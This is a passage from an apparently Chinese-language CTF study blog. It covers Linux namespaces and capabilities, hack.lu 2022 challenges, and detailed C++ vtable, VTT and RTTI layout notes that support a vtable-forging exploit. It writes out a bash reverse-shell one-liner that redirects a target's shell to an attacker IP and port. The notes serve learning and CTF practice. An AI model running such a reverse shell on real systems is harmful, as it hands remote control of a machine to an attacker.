<li>不同namespace的process访问同一个process的uid_map文件可能会产生不同的结果. </li>
<li>因为该行是一个映射, 当访问文件在同一个namespace指<code>内部uid -&gt; 父space uid</code>, 当在不同namespace时指<code>内部uid -&gt; 访问进程space uid</code> </li>
<li>写入的程序必须在父space或者同一个space; 被映射的uid在进程space内也必须有map; 有相应的caps.</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo echo &#x27;0 1000 1\n1000 0 1&#x27; &gt; /proc/121634/uid_map<br></code></pre></div></td></tr></table></figure>

<ul>
<li>The <code>/proc/[pid]/setgroups</code> file<ul>
<li>setgroups() sets the <em><strong><u>supplementary group IDs</u></strong></em> for the calling process.</li>
<li>gid_map没设置以及上面的文件显示”deny”时, 不能用setgroups()</li>
<li>gid_map设置之后(setgroups已确定是否启用)不能通过写入<strong>任何字符</strong>来改变.<br>进程只能从禁止setgroups(未map)变化到允许setgroups(写入allow)</li>
<li>在Linux 3.19被加入. 解决了”rwx—rwx”文件的问题. 即换到other user反而提权了, by denying any pathway for an unprivileged process to drop groups with setgroups(2).</li>
</ul>
</li>
<li><code>/proc/sys/kernel/overflowuid</code>: 未map时尝试读取uid会显示的数字. 在uid_map第二个field没有map时也可能显示4294967295.</li>
<li>权限检查时uid会转换到initial user namespace中的uid. </li>
</ul>
</li>
<li><p>capabilities:</p>
<ul>
<li>进程有四个set, 文件有p和i加上一个effective bit.</li>
<li>四个set看了老半天不知道实际是如何操作的, 只有effective和bounding能看明白. bounding应该是个全集, 不过也能够对其进行删减, 意义不明. permitted set应该为该进程允许获得的caps. ambient更是<strong>完全不懂</strong>. </li>
<li>下图是执行execve时cap的变化情况. 注意到当文件effective bit为1时文件的permitted加入了effective set, 这也是一些blog演示ping文件的利用之处, 即<code>cap_net_raw+ep</code>; 这和ambient有啥不同?</li>
</ul>
<img src="../../image/recent_ctf/image-20221026212243834.png" srcset="/img/loading.gif" lazyload alt="image-20221026212243834" style="zoom:80%;" /></li>
<li><p>credentials</p>
<ul>
<li>看到还有个Filesystem user ID and filesystem group ID, 只能说不知道有什么用, 只看到是和supplementary group IDs一起用于判断文件access permissions.</li>
<li>Supplementary group IDs: 一个用户属于一个primary group, 同时又属于多个Supplementary group, 这样就不用切换了, 主要是省事. 在<code>id</code>命令第一个group后面跟着的东西就是. </li>
</ul>
</li>
<li><p><code>capsh getcap setcap getpcaps</code> 和 <code>grep Cap /proc/self/status</code> </p>
</li>
</ul>
<h2 id="看不见的彼方"><a href="#看不见的彼方" class="headerlink" title="看不见的彼方"></a>看不见的彼方</h2><p>额, 先看rust去了. </p>
<h1 id="hack-lu-2022"><a href="#hack-lu-2022" class="headerlink" title="hack.lu 2022"></a>hack.lu 2022</h1><h2 id="ordersystem"><a href="#ordersystem" class="headerlink" title="ordersystem"></a>ordersystem</h2><p>一眼看到python中<code>socket.socket()</code> 先查一下以前没注意的东西.</p>
<ul>
<li><p><code>setsockopt</code>使用场景: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/77023584">link</a> </p>
</li>
<li><p>reuseaddr/reuseport: <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9cc2b5b9ad4d">查询过程源码</a> <a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000020524323">reuseport版本演进</a> </p>
</li>
<li><p>bind到 0.0.0.0, 127.0.0.1 localhost 有何<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/20778771">区别</a> </p>
</li>
<li><p>在docker环境上遇到一点小问题, 重新build了一下. woc为什么链接没反应?? 好吧重启解决问题了. <code>service docker restart</code> </p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16289320.html">反弹shell</a> </p>
<ul>
<li><p><code>bash -i &gt;&amp; /dev/tcp/192.168.1.102/7777 0&gt;&amp;1</code>　　（实际的命令解析为：将目标主机的bash shell以-i交互式的方式，标准输出+错误输出重定向到192.168.1.102:7777，而在192.168.1.102:7777的标准输入命令会重定向到192.168.1.102:7777的标准输出中）</p>
<p><strong>简言而知，就是将目标主机的标准输入、标准输出、错误输出全都重定向到攻击端上</strong> </p>
</li>
</ul>
</li>
<li><p>python的bytecode真没了解过, 要暴毙了. 这能上哪儿搜. 跟cpython有挺大关系. 又查到了python vm. 又是python的fundamental, 我要疯了怎么又来这么多的东西. 一看就是一星期的量ahhhhhhhhhhhhhhhhhhhhh</p>
</li>
</ul>
<p>bytecode relevant:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3299648/python-compilation-interpretation-process">bytecode instance</a> | <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19916729/how-exactly-is-python-bytecode-run-in-cpython">theory</a>. 一篇巨长的<a target="_blank" rel="noopener" href="https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d">文章</a>, 连指令都全部列出来. </li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Stack_machine">stack machine</a> vs. register machine<ul>
<li>Stack machines extend <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Push-down_automata">push-down automata</a> with additional load/store operations or multiple stacks and hence are <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Turing-complete">Turing-complete</a>.</li>
<li></li>
</ul>
</li>
</ul>
<h2 id="RIOT"><a href="#RIOT" class="headerlink" title="RIOT"></a>RIOT</h2><p>RIOT src <a target="_blank" rel="noopener" href="https://github.com/RIOT-OS/RIOT/blob/a21f05aeffd9fdf0e61026d85b465c652a9cf8c9/drivers/ethos/ethos.c#L379">off-by-one</a> </p>
<ul>
<li></li>
<li></li>
</ul>
<h2 id="placemat"><a href="#placemat" class="headerlink" title="placemat"></a>placemat</h2><ul>
<li>看到一个meson.build文件, 才知道这是一个和cmake同类型的build scripts generation. Wiki<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_build_automation_software">在此</a> </li>
</ul>
<p>居然是32位程序, 除了PIE其他都开了. </p>
<p>woc为什么在ubuntu上运行不了?? 2.34用allinone装上之后都没有了符号链接, 这能用???? 在ubuntu2004 22204里运行都给我说no such file or directory. 差不多得了. </p>
<p>搞不定这个环境. 理解不能, 这c++的库都是用的啥? glibc不能直接用吧. 果然还是放弃这种比赛题比较实际, 大半天啥也没试出来. 又被crazyman叫来看看, 我…还是试试从源码编译吧…</p>
<ul>
<li>学了两下meson: <code>meson setup [build directory]</code> <code>cd [build directory] &amp;&amp; meson compile</code> <ul>
<li>每个build directory都有各自的配置, 分成一个个文件夹便于测试. </li>
<li><code>meson compile == ninja</code>, 因为meson的默认backend是ninja. </li>
</ul>
</li>
<li>发现缺失<code>bits/c++config.h</code>, 然后准备安装<code>g++-multilib</code>, 然后又发现kali里的libc6-dev版本过低导致依赖的libglib2.0-dev也较低, 结果是libglib2.0-dev无法安装更新版本. 执行<code>pc apt --only-upgrade install libc6-dev</code>后解决. 最终执行<br><code>apt install g++-multilib</code>. </li>
</ul>
<p>怎么调试C++里面的类和一些变量布局我还得熟悉下. </p>
<ul>
<li>看了看C++17的optional. <a target="_blank" rel="noopener" href="https://devblogs.microsoft.com/cppblog/stdoptional-how-when-and-why/">post</a> 就像是刚刚看的rust里的Option&lt;T&gt;. </li>
<li>额还得看看c++编译器是怎么实现class的. 找个<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/508050978">文章</a>.  </li>
</ul>
<hr>
<p>可能有的问题:</p>
<ul>
<li>Human::requestName中<code>scanf(&quot;%s&quot;, this-&gt;name);</code>没有限制长度. 鬼知道溢出到了什么地方. 好了现在知道了.</li>
<li>还有个strcpy有个非常没用的栈溢出. </li>
<li>flag的获取必须是赢过bot. </li>
</ul>
<p>然后队里别人先做出来了(不出所料), 是伪造虚表然后装成bot, 自己赢过自己获取flag. 我先调试看看c++的class<strong>怎么布局</strong>的. </p>
<ul>
<li>首先研究构造函数, 发现<code>Human human</code>声明语句即构造函数调用语句, 参数为栈上指针, 大小为ebp-0x20的位置, 这个就是this指针. 然后继续调用父类构造清空name成员, name成员由this来定位. 不过name不是this指向的空间, 前四字节是用来标识子类的一串数字(也许有什么特殊含义). 好吧原来是虚表地址, <em>对象的虚表指针用来指向自己所属类的虚表，虚表中的指针会指向其继承的<strong>最近的</strong>一个类的虚函数</em>. 地址到IDA里看看更多信息. </li>
<li>Player这个基类的两个函数加析构都是虚函数, 但是析构没有定义, 所以在<strong>虚表里面是NULL</strong>.  </li>
<li>超出作用域的class直接调用析构函数, 如局部class在函数末尾的析构. </li>
<li>注意到文件里除了vtable for Bot之类的还有</li>
<li>果然还是ABI标准更全面一些. <del>省的自己在这儿乱研究</del>. 标准真的太长了. <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/60454989/how-is-type-info-implemented">stackoverflow</a> </li>
</ul>
<p>继续研究:</p>
<ul>
<li>在startSingleplayer()函数栈帧里存储有两个玩家的object, 以虚指针开头总共4(vptr)+20(name)=24=0x18字节, 初始name被填满空字符, 输入玩家名称时可以填满20字节<del>达到leak之后的数据的目的</del>. scanf会加空字符, 必须修改后才能leak. </li>
<li>human是栈上靠近栈底的变量, 在[ebp-0x20]的位置, 0xc(12)处还有个canary, 栈底八字节没啥用处</li>
<li><del>takeTurn中又是%s, 输出长度没有限制.</del>  </li>
</ul>
<blockquote>
<p>重大发现, 这个程序是32位的, 所以要用32位库. 真是好一个重大发现, 难怪patchelf和ubuntu2204(默认没有32位运行环境)都不行. 好的下了debian32位2.35libc成功了. </p>
</blockquote>
<blockquote>
<p>绝了, 自己编译的做不出来, 但是源文件是可以的, <del>因为两个class离canary有更大的距离,</del> 因为Game class放到了两个Player class的后面, 而Game前几个成员变量是player opponent之类的, 可以解决scanf默认添加的空字符问题. emmmm这样究竟是怎么出题的, 是巧合还是能控制变量在栈上的位置? 但是源文件调试是真的不爽, 什么符号都没有. 难不成要ida修复符号然后远程调试? 想想都麻烦. 而且有些输入不是我能打出来的. 还是pwntools吧. </p>
</blockquote>
<blockquote>
<ul>
<li><del>我是不明白为什么random::bit会一直只选第一个玩家, 完全没有随机性可言. 但是自己编译的程序就可以. (????????)</del> <del>只是我运气好罢了.</del> 居然是下面这个问题的原因. </li>
<li>为什么都定义了%20s了但是在printPlayerNames还是会打印出超过20个字符???????什么魔法啊这是.<br>我又知道了, 原来scanf和printf也是不一样的. <code>printf(&quot;%20s&quot;, buf);</code>限制的只是对齐宽度, 如果字符串更长就会忽略这个对齐. <code>%20s</code>用在scanf里才是限制输入的string, 然而在printf里如果要限制输出长度则要用<code>%.20s</code>, 或者是在参数中提供长度<code>%.*s</code>(还可以是某个位置的参数, 具体见printf手册)(左对齐是<code>%-20s</code>)</li>
</ul>
</blockquote>
<ul>
<li>在congratulate中看到<a target="_blank" rel="noopener" href="https://en.cppreference.com/w/cpp/language/typeid"><code>typeid</code></a>宏, 对一个多态对象求类型id. 实质上是???? 只查到是查个虚表, 待我看看汇编. 看到了<a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html">c++ abi</a>, 然而内容太多我抓不住重点. 又找了一个series <a target="_blank" rel="noopener" href="https://shaharmike.com/cpp/vtable-part1/">blog</a>. 真的太多了, 但我真的想看懂ABI.<br>不如Stack Overflow里的<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class">清楚</a> 还是有例子的好些, 一堆文字真的很难看懂. </li>
</ul>
<h3 id="c-abi-vtables-amp-RTTI"><a href="#c-abi-vtables-amp-RTTI" class="headerlink" title="c++ abi (vtables &amp; RTTI)"></a>c++ abi (vtables &amp; RTTI)</h3><ul>
<li><p>_ZTV is a prefix for vtable, _ZTS is a prefix for type-string (name) and _ZTI is for type-info.</p>
</li>
<li><p>重要的概念</p>
<ul>
<li><em>primary base class</em>: For a dynamic class, the unique base class (if any) with which it shares the virtual pointer at offset 0.</li>
<li><em>proper base class</em>: 继承树中一个类的所有父类</li>
<li><em>secondary virtual table</em>: The instance of a virtual table for a base class that is <strong>embedded</strong> in the virtual table of a class derived from it.</li>
<li><em>The primary virtual table</em> can be viewed as two virtual tables accessed from a shared virtual table pointer. </li>
<li><em>virtual table group</em>: The primary virtual table for a class along with all of the associated secondary virtual tables for its proper base classes.</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-components">vtable components</a> </p>
<ul>
<li><em>Virtual Base (vbase) offsets</em> are used to access the virtual bases of an object.</li>
<li>The <em>offset to top</em> holds the displacement to the top of the object from the location within the object of the virtual table pointer that addresses this virtual table</li>
<li>The <em>typeinfo pointer</em> points to the typeinfo object used for RTTI</li>
<li>The virtual table address point <strong>points here</strong> </li>
<li><em>Virtual function pointers</em>. Each pointer holds either the address of a virtual function of the class, or the address of a secondary entry point that performs certain adjustments before transferring control to a virtual function.</li>
</ul>
</li>
<li><p><a target="_blank" rel="noopener" href="https://itanium-cxx-abi.github.io/cxx-abi/abi.html#vtable-construction">vtable construction</a> 详细讲了proper base class在各种情况下应该怎样构建vtable. </p>
<ul>
<li>比如<br><code>No inherited virtual functions</code><br><code>No virtual base classes</code><br><code>Declares virtual functions</code>时, vtable就是简单的offset-to-top &amp; RTTI fields &amp; virtual function pointers</li>
<li></li>
</ul>
</li>
<li><p>The elements of the VTT array for a class D:<br>which is declared for each class type that <strong>has indirect or direct virtual base classes</strong>.</p>
<ul>
<li><p><strong>Primary virtual pointer</strong></p>
<p>: address of the primary virtual table for the complete object D.</p>
</li>
<li><p><strong>Secondary VTTs</strong></p>
<p>: for each direct non-virtual proper base class B of D that requires a VTT, in declaration order, a sub-VTT for B-in-D, structured like the main VTT for B, with a primary virtual pointer, secondary VTTs, and secondary virtual pointers, but without virtual VTTs.</p>
<p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" srcset="/img/loading.gif" lazyload alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>This construction is applied recursively.</em></p>
</li>
<li><p><strong>Secondary virtual pointers</strong></p>
<p>: for each base class X which (a) has virtual bases or is reachable along a virtual path from D, and (b) is not a non-virtual primary base, the address of the virtual table for X-in-D or an appropriate construction virtual table.</p>
<p>X is reachable along a virtual path from D if there exists a path X, B1, B2, …, BN, D in the inheritance graph such that at least one of X, B1, B2, …, or BN is a virtual base class.</p>
<p>The order in which the virtual pointers appear in the VTT is inheritance graph preorder.</p>
<p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" srcset="/img/loading.gif" lazyload alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>There are virtual pointers for direct and indirect base classes. Although primary non-virtual bases do not get secondary virtual pointers, they do not otherwise affect the ordering.</em></p>
<p><em>Primary virtual bases require a secondary virtual pointer in the VTT because the derived class with which they will share a virtual pointer is determined by the most derived class in the hierarchy.</em></p>
<p><em>Secondary virtual pointers may be required for base classes that do not require secondary VTTs. A virtual base with no virtual bases of its own does not require a VTT, but does require a virtual pointer entry in the VTT.</em> </p>
</li>
<li><p><strong>Virtual VTTs</strong></p>
<p>: For each proper virtual base classes in inheritance graph preorder, construct a sub-VTT as in (2) above.</p>
<p><img src="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif" srcset="/img/loading.gif" lazyload alt="&lt;b&gt;NOTE&lt;/b&gt;:"> <em>The virtual VTT addresses come last because they are only passed to the virtual base class constructors for the complete object.</em></p>
</li>
</ul>
</li>
<li><p>单继承</p>
<ul>
<li>子类虚表如下, 注意子类内存中虚表指针指向下表第三项. 即跳过前两项. </li>
</ul>
<table>
<thead>
<tr>
<th>Address</th>
<th>Value</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>0x400b40</td>
<td>0x0</td>
<td><code>top_offset</code> (more on this later)</td>
</tr>
<tr>
<td>0x400b48</td>
<td>0x400b90</td>
<td>Pointer to <code>typeinfo for Derived</code> (also part of the above memory dump)</td>
</tr>
<tr>
<td>0x400b50</td>
<td>0x400a80</td>
<td>Pointer to <code>Derived::Foo()</code>3. <strong><code>Derived</code>’s _vptr points here.</strong></td>
</tr>
<tr>
<td>0x400b58</td>
<td>0x400a90</td>
<td>Pointer to <code>Parent::FooNotOverridden()</code> (same as <code>Parent</code>’s)</td>
</tr>
</tbody></table>
</li>
<li><p>多继承</p>
<ul>
<li>多继承时最下层的子类的内存中有多个指针, 如下表所示. 为什么内存中还有两个vptr? 因为child可能被转换为<code>Father*</code>或者<code>Mother*</code>类型的指针当做参数传递, 此时接收参数的函数不需要知道child的存在也能够访问下面内存布局中的Father部分. data显然在要其中, 而Father的虚表指针自然也会在这里, 指向child vtable以提供虚函数的信息. </li>
</ul>
<table>
<thead>
<tr>
<th>_vptr$Mother</th>
</tr>
</thead>
<tbody><tr>
<td>mother_data (+ padding)(这是什么padding??)</td>
</tr>
<tr>
<td>_vptr$Father = non-virtual thunk to Child::FatherFoo(void)</td>
</tr>
<tr>
<td>father_data</td>
</tr>
<tr>
<td>child_data1</td>
</tr>
</tbody></table>
<ul>
<li>值得注意的是现在child vtable里实际上装下了<strong>两个table</strong>. 如下vtable的第二部分. </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `vtable for&#x27;Child<br>  _ZTV5Child       dq 0                    ; offset to this<br>                   dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>  off_555555557D48 dq offset _ZN6Mother9MotherFooEv<br>                                          ; DATA XREF: main+8↑o<br>                                          ; Mother::MotherFoo(void)<br>                   dq offset _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>                   dq -8                   ; offset to this<br>                   dq offset _ZTI5Child    ; `typeinfo for&#x27;Child<br>  off_555555557D68 dq offset _ZThn8_N5Child9FatherFooEv<br>  									 ; `non-virtual thunk to&#x27;Child::FatherFoo(void)<br></code></pre></div></td></tr></table></figure></li>
<li><p><strong>但是</strong>, 当子类继承父类时<strong>重载了</strong>父类函数, 为了要使 利用多态将<code>child* this</code>的指针转换为<code>father* this</code>然后<code>ptr-&gt;FatherFoo()</code>的函数能够执行<strong>child</strong>::FatherFoo(), 编译器会识别到重载的存在, 并生成上表的child class结构, 并且生成一个thunk代码片段代替Father::Foo()来调整this指针使得其变成child的class ptr. 其中<code>_vptr$Father</code>指向的secondary virtual table中会是这个thunk的地址. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.text:0000555555555227 ; __int64 __fastcall `non-virtual thunk to&#x27;Child::FatherFoo(Child *__hidden this)<br>.text:0000555555555227                 public _ZThn8_N5Child9FatherFooEv<br>.text:0000555555555227 _ZThn8_N5Child9FatherFooEv proc near<br>.text:0000555555555227                 sub     rdi, 8          ; this<br>.text:000055555555522B                 jmp     short _ZN5Child9FatherFooEv ; Child::FatherFoo(void)<br>.text:000055555555522B _ZThn8_N5Child9FatherFooEv endp<br></code></pre></div></td></tr></table></figure>

<ul>
<li>vtable中top_offset即为-8的那一行,  看起来只是提供一个信息提示, 指child内存中Father部分到内存top的距离.<br>thunk代码中直接使用<code>sub rdi, 8</code>并未引用该处数据. </li>
</ul>
</li>
<li><p>三重多继承, 虚继承Grandparent class.</p>
<ul>
<li>新东西: <code>construction vtable for Parent1-in-Child</code> <code>VTT for Child</code> <code>virtual-base offset</code> </li>
<li><code>virtual-base offset</code>是针对Child::Child()中Patent1初始化时要访问Grandpatent数据时, this指针(此时指向Child内存中Parent1部分, 也就是Child开头)到child内存中Grandpatent部分的偏移量. </li>
<li>IDA中<code>construction vtable for Patent1-in-Child</code>和<code>vtable for Parent</code>基本重叠, 除了前者开头的<code>virtual-base offset</code>在后者上方.</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">; `construction vtable for&#x27; Parent1-in-Child<br>	_ZTC5Child0_7Parent1 dq 20h 	; that is virtual-base offset<br>; `vtable for&#x27; Parent1<br>	...<br></code></pre></div></td></tr></table></figure>

<ul>
<li>VTT</li>
</ul>
<table>
<thead>
<tr>
<th>Address</th>
<th>Value</th>
<th>Symbol</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>0x4009a0</td>
<td>0x400950</td>
<td><code>vtable for Child + 24</code></td>
<td><code>Parent1</code>’s entries in <code>Child</code>’s vtable</td>
</tr>
<tr>
<td>0x4009a8</td>
<td>0x4009f8</td>
<td><code>construction vtable for Parent1-in-Child + 24</code></td>
<td><code>Parent1</code>’s methods in <code>Parent1-in-Child</code></td>
</tr>
<tr>
<td>0x4009b0</td>
<td>0x400a18</td>
<td><code>construction vtable for Parent1-in-Child + 56</code></td>
<td><code>Grandparent&#39;s methods for Parent1-in-Child</code></td>
</tr>
<tr>
<td>0x4009b8</td>
<td>0x400a98</td>
<td><code>construction vtable for Parent2-in-Child + 24</code></td>
<td><code>Parent2&#39;s methods in Parent2-in-Child</code></td>
</tr>
<tr>
<td>0x4009c0</td>
<td>0x400ab8</td>
<td><code>construction vtable for Parent2-in-Child + 56</code></td>
<td>`Grandparent’s methods for Parent2-in-Child</td>
</tr>
<tr>
<td>0x4009c8</td>
<td>0x400998</td>
<td><code>vtable for Child + 96</code></td>
<td>`Grandparent’s entries in Child’s vtable</td>
</tr>
<tr>
<td>0x4009d0</td>
<td>0x400978</td>
<td><code>vtable for Child + 64</code></td>
<td>`Parent2’s entries in Child’s vtable</td>
</tr>
</tbody></table>
<p>为什么会有VTT? 来看看child的初始化就明白了:</p>
<ul>
<li>首先Grandparent construction, 初始化vtable指针指向primary vtable.</li>
<li>然后Parent1初始化Child内存中的vtable ptr为VTT中Parent1-in-Child值(也就是vtable for Parent1),<br><strong>再修改GrandParent vtable指针指向其vtable中的Grandparent部分</strong>. 关键在于Parent1如何知道其子类Child内存中Grandparent和他自身的距离? 方法就是传入了VTT地址, 两个Parent1-in-Child指针指示了对应的construction table和该table中的vbase offset. <ul>
<li>其实这种情况下只传一个指针也是足够的, 但是当parent也有多个基类时就不得不使用VTT了, 很明显需要访问其多个基类的secondary vtable中的vbase offset来确定多个基类的vtable指针值(都在Child内存中). </li>
</ul>
</li>
<li>然后Parent2继续初始化并且又修改了Grandparent的vtable指针. </li>
<li>因为基类的构造不应假设是其子类调用的构造函数, 所以最后Child把所有vtable指针值改向了Child vtable中的几个父类部分. </li>
</ul>
<p>如果情况变成</p>
</li>
<li><p>“in-charge” and “not-in-charge” constructor and destructor: stackoverflow<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/6258559/what-is-the-vtt-for-a-class#:~:text=Now%2C%20in%20fact%2C%20the%20story%20is%20somewhat%20more%20complicated.">解释</a>  </p>
<blockquote>
<p>构造函数可以不一样: 还是上面的例子, 如果出现了Child的定义, 但是还出现了Parent的定义, 就会有两个Parent构造函数,一个只用在Child::Child()中, 另一个用在Parent自身的构造之中. 也是所谓的in or not in charge constructor</p>
</blockquote>
<ul>
<li>An “in-charge” (or complete object) constructor is one that constructs virtual bases,<br>and a “not-in-charge” (or base object) constructor is one that does not.</li>
<li>嗯, 不想看了. 还有一些destructor的东西. </li>
</ul>
</li>
<li><p>多重继承时vtable最后的是VTT, 也就是vtable的table. </p>
</li>
</ul>
<p><strong>RTTI</strong> </p>
<ul>
<li>The typeid operator produces a <strong>reference</strong> to a std::type_info structure with the following public interface</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"> <span class="hljs-keyword">namespace</span> std &#123;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">type_info</span> &#123;</span><br>     <span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">type_info</span>();<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br><span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>!=(<span class="hljs-keyword">const</span> type_info &amp;) <span class="hljs-keyword">const</span>;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">before</span><span class="hljs-params">(<span class="hljs-keyword">const</span> type_info &amp;)</span> <span class="hljs-keyword">const</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">name</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>     <span class="hljs-keyword">private</span>:<br><span class="hljs-built_in">type_info</span> (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>type_info&amp; <span class="hljs-keyword">operator</span>= (<span class="hljs-keyword">const</span> type_info&amp; rhs);<br>   &#125;;<br> &#125;<br></code></pre></div></td></tr></table></figure>

<ul>
<li>除了指向不完全类型的直接或间接指针外，相等和不等操作符在操作type_info对象时可以写成地址比较:两个type_info结构体当且仅当它们是相同的结构体(在相同的地址)时，它们描述的是相同的类型。</li>
<li>layout<ul>
<li><code>abi::__class_type_info</code> is used for class types having no bases, and is also a base type for the other two class type representations.</li>
<li>不看了. </li>
</ul>
</li>
</ul>
<hr>
<p>真的会累死. 回过头来一看typeid也就是这么点东西:</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> __cdecl <span class="hljs-built_in">std</span>::type_info::<span class="hljs-keyword">operator</span>==(<span class="hljs-built_in">std</span>::type_info *a1, <span class="hljs-built_in">std</span>::type_info *a2)<br>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int8)<span class="hljs-built_in">std</span>::__is_constant_evaluated() )<br>    <span class="hljs-keyword">return</span> a1 == a2;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)a1 + <span class="hljs-number">1</span>) == *((_DWORD *)a2 + <span class="hljs-number">1</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( **((_BYTE **)a1 + <span class="hljs-number">1</span>) == <span class="hljs-number">42</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  v3 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)<span class="hljs-built_in">std</span>::type_info::name(a2);<br>  <span class="hljs-keyword">return</span> !<span class="hljs-built_in">strcmp</span>(*((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)a1 + <span class="hljs-number">1</span>), v3);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>第二个if直接比较的是demangled name. 但是简单的修改指针为Bot虚表会导致执行Bot::taketurn对象函数. 所以我们需要伪造整个虚表而typename是, 就在栈上, 所以才需要leak栈指针. 这个修改发生在第二局, 此时进入的是Game::Multiplayer(), 就算破坏canary也没有关系, 能够在Game::play()函数里执行congratulate就可以了. </p>
<blockquote>
<p>嗯, 需不需要四字节对齐? 好吧栈上的东西已经是对齐的了, 只要从name开头就可以. </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">.rodata:0804C35C                 dd 0                    ; offset to this<br>.rodata:0804C360                 dd offset _ZTI5Human    ; `typeinfo for&#x27;Human<br>.rodata:0804C364 off_804C364     dd offset _ZN5HumanD2Ev ; DATA XREF: Human::Human(void)+15↑o<br>.rodata:0804C364                                         ; Human::~Human()+6↑o<br>.rodata:0804C364                                         ; Human::~Human()<br>.rodata:0804C368                 dd offset sub_804AEF2<br>.rodata:0804C36C                 dd offset requestName<br>.rodata:0804C370                 dd offset Human__takeTurn<br><br>.rodata:0804C1D4 ; `typeinfo for&#x27;Bot<br>.rodata:0804C1D4 _ZTI3Bot        dd offset unk_804EEC8   ; DATA XREF: 